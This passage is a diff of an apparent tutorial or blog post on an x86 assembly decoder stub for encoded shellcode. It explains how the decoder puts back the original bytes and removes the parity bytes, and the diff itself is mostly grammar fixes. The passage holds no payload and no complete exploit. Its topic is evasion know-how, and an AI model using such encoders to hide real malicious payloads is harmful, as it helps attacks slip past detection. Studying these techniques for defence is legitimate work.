+</span></span></code></pre></div><p>At this stage, the trick is already done. We do replace the encoded shellcode byte for the original one using <code>edx</code> as an offset. Then, we move to <code>bl</code> the next encoded byte.</p>
+<p>We can&rsquo;t forget to remove the last used parity byte from the encoded shellcode. In the <code>decode</code> branch, we set up <code>edi</code> to point the address of the first parity byte. To remove this byte, we can make the next encoded shellcode byte take its place. In practical terms, we copy the next encoded byte to the address of the last parity byte with the instruction <code>mov byte [edi], bl</code></p>
 <p>Then, we prepare he next iteration by:</p>
 <ul>
-<li>pointing <code>edi</code> to the position of next parity byte</li>
+<li>pointing <code>edi</code> to the position of the subsequent parity byte</li>
 <li><code>al</code> poiting to the next parity byte offset</li>
 <li><code>dl</code> poiting to the next encoded byte</li>
-<li>incrementing <code>cl</code> which is used as the loop index value</li>
+<li>incrementing <code>cl</code>, which is used as the loop index value</li>
 </ul>
-<p>The last part, we check if we reach the end of the <code>circular array</code>. As we are rotating 8 bits, we can&rsquo;t rotate no more than that. this way we aresynchronized with the encoder implementation.</p>
+<p>In the last part, we check if we reach the end of the <code>circular array</code>. As we rotate 8 bits, we can’t turn any more than that. This way, we are synchronized with the encoder implementation.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>restore_next_byte:
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">edx</span>], <span style="color:#66d9ef">bl</span>		<span style="color:#75715e">; replaces the original byte
